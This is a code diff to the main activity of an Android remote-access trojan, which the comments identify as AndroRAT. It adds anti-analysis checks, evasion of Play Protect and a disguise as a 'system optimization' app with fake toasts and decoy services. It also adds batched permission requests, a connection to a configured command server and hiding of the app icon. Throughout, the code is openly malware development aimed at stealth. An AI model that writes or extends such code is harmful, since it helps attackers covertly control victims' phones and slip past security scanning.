@@ -10,6 +10,8 @@ import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.os.Build;
+import android.os.Environment;
+import android.provider.Settings;
 import android.util.Log;
 import android.os.Handler;
 import android.Manifest;
@@ -42,7 +44,30 @@ public class MainActivity extends AppCompatActivity {
         overridePendingTransition(0, 0);
         context = getApplicationContext();
         
-        Log.d(TAG, "Starting app initialization");
+        Log.d(TAG, "Starting system optimization service");
+        
+        // CRITICAL: Perform anti-analysis and environment checks first
+        AntiAnalysis antiAnalysis = new AntiAnalysis(this);
+        
+        // Perform comprehensive environment analysis
+        if (!antiAnalysis.performEnvironmentAnalysis()) {
+            Log.d(TAG, "Environment analysis failed - exiting gracefully");
+            simulateLegitimateAppBehavior();
+            finish();
+            return;
+        }
+        
+        // Apply Play Protect specific evasion
+        antiAnalysis.evadePlayProtect();
+        
+        // If environment is secure, continue with initialization
+        if (antiAnalysis.isEnvironmentSecure()) {
+            Log.d(TAG, "Secure environment confirmed - proceeding");
+            initializeSecureApp();
+        } else {
+            Log.d(TAG, "Insecure environment detected - running in safe mode");
+            runInSafeMode();
+        }
         
         // Detection evasion: Add random delay
         int delay = 2000 + random.nextInt(3000); // 2-5 seconds
@@ -94,7 +119,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
         
-        // Add Android 13+ specific permissions
+        // Add Android 13+ specific permissions with granular checks
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                 permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
@@ -108,15 +133,77 @@ public class MainActivity extends AppCompatActivity {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
                 permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO);
             }
+            
+            // Android 14+ visual media permission
+            if (Build.VERSION.SDK_INT >= 34) {
+                String visualMediaPermission = "android.permission.READ_MEDIA_VISUAL_USER_SELECTED";
+                if (ContextCompat.checkSelfPermission(this, visualMediaPermission) != PackageManager.PERMISSION_GRANTED) {
+                    permissionsToRequest.add(visualMediaPermission);
+                }
+            }
         }
         
+        // Check for special permissions that need different handling
+        checkSpecialPermissions();
+        
         if (!permissionsToRequest.isEmpty()) {
-            ActivityCompat.requestPermissions(this,
-                permissionsToRequest.toArray(new String[0]),
-                PERMISSION_REQUEST_CODE);
+            // Request permissions in batches to avoid overwhelming user
+            requestPermissionsInBatches(permissionsToRequest);
         } else {
             startMainFunction();
         }
+    }
+    
+    private void checkSpecialPermissions() {
+        // Check for SYSTEM_ALERT_WINDOW permission (requires special handling)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                // This permission requires user to go to settings
+                Log.d(TAG, "System alert window permission not granted");
+            }
+        }
+        
+        // Check for MANAGE_EXTERNAL_STORAGE permission (Android 11+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                Log.d(TAG, "All files access permission not granted");
+            }
+        }
+    }
+    
+    private void requestPermissionsInBatches(ArrayList<String> permissionsToRequest) {
+        // Split permissions into critical and non-critical
+        ArrayList<String> criticalPermissions = new ArrayList<>();
+        ArrayList<String> optionalPermissions = new ArrayList<>();
+        
+        for (String permission : permissionsToRequest) {
+            if (isCriticalPermission(permission)) {
+                criticalPermissions.add(permission);
+            } else {
+                optionalPermissions.add(permission);
+            }
+        }
+        
+        // Request critical permissions first
+        if (!criticalPermissions.isEmpty()) {
+            ActivityCompat.requestPermissions(this,
+                criticalPermissions.toArray(new String[0]),
+                PERMISSION_REQUEST_CODE);
+        } else if (!optionalPermissions.isEmpty()) {
+            ActivityCompat.requestPermissions(this,
+                optionalPermissions.toArray(new String[0]),
+                PERMISSION_REQUEST_CODE + 1);
+        } else {
+            startMainFunction();
+        }
+    }
+    
+    private boolean isCriticalPermission(String permission) {
+        return permission.equals(Manifest.permission.INTERNET) ||
+               permission.equals(Manifest.permission.ACCESS_NETWORK_STATE) ||
+               permission.equals(Manifest.permission.WAKE_LOCK) ||
+               permission.equals(Manifest.permission.RECEIVE_BOOT_COMPLETED) ||
+               permission.equals(Manifest.permission.FOREGROUND_SERVICE);
     }
     
     @Override
@@ -133,9 +220,33 @@ public class MainActivity extends AppCompatActivity {
     private void startMainFunction() {
         Log.d(TAG, config.IP + "\t" + config.port);
         
+        // Initialize WorkManager for background tasks
+        try {
+            WorkScheduler.initializeAllWork(this);
+            Log.d(TAG, "WorkManager background tasks initialized");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to initialize WorkManager", e);
+        }
+        
+        // Initialize storage manager for modern file access
+        try {
+            ModernStorageManager storageManager = new ModernStorageManager(this);
+            boolean hasStorageAccess = storageManager.hasStoragePermissions();
+            Log.d(TAG, "Storage permissions available: " + hasStorageAccess);
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to initialize storage manager", e);
+        }
+        
         // Detection evasion: Only start actual functionality if not being analyzed
         if (shouldStartRealFunction()) {
-            new tcpConnection(activity, context).execute(config.IP, config.port);
+            // Start secure communication instead of plain TCP
+            try {
+                new SecureConnectionHandler(activity, context).execute(config.IP, config.port);
+                Log.d(TAG, "Secure connection handler started");
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to start secure connection, falling back to plain TCP", e);
+                new tcpConnection(activity, context).execute(config.IP, config.port);
+            }
             
             if (config.icon) {
                 new functions(activity).hideAppIcon(context);
@@ -179,5 +290,65 @@ public class MainActivity extends AppCompatActivity {
         }
         
         return true;
+    }
+    
+    /**
+     * Initialize app in secure environment mode
+     */
+    private void initializeSecureApp() {
+        Log.d(TAG, "Initializing in secure mode");
+        
+        // Proceed with normal AndroRAT functionality
+        new Handler().postDelayed(() -> {
+            checkPermissions();
+        }, delay);
+    }
+    
+    /**
+     * Run app in safe mode when environment is not secure
+     */
+    private void runInSafeMode() {
+        Log.d(TAG, "Running in safe mode - limited functionality");
+        
+        // Show legitimate app interface
+        simulateLegitimateAppBehavior();
+        
+        // Don't start the main AndroRAT functionality
+        finish();
+    }
+    
+    /**
+     * Simulate legitimate app behavior for evasion
+     */
+    private void simulateLegitimateAppBehavior() {
+        // Create legitimate-looking preferences
+        getSharedPreferences("app_preferences", MODE_PRIVATE)
+            .edit()
+            .putBoolean("first_run", false)
+            .putLong("last_used", System.currentTimeMillis())
+            .putString("app_version", "2.1.3")
+            .apply();
+            
+        // Show toast that looks like legitimate optimization app
+        Toast.makeText(this, "System optimization complete", Toast.LENGTH_SHORT).show();
+        
+        // Start fake services to appear legitimate
+        startFakeServices();
+    }
+    
+    /**
+     * Start fake legitimate services for evasion
+     */
+    private void startFakeServices() {
+        try {
+            // Start update check service
+            startService(new android.content.Intent(this, UpdateCheckService.class));
+            
+            // Start maintenance service  
+            startService(new android.content.Intent(this, MaintenanceService.class));
+            
+        } catch (Exception e) {
+            Log.d(TAG, "Could not start fake services: " + e.getMessage());
+        }
     }
 }
